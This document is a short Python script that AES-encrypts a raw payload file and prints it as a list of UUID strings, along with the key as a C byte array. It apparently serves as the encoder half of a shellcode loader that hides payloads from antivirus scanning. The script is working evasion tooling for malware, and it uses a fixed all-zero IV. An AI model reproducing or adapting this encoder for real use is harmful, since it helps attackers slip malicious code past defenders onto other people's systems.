""" 
AES encrypt raw-bytes file and then covert it into Uuids
"""

import uuid
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

try:
    payload = open(sys.argv[1], "rb").read()
except:
    print("File path needed %s <path to raw payload>" % sys.argv[0])
    sys.exit()

encPayload = cipher.encrypt(pad(payload, AES.block_size))

chunk = 16
split_file = [encPayload[i:i+chunk].ljust(chunk, b'\x00') for i in range(0, len(encPayload), chunk)]
uuid_list = [str(uuid.UUID(bytes_le=split_file[i])) for i in range(len(split_file))]
[print('"' + uuid_list[i] + '",') for i in range(len(uuid_list))]
print('key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
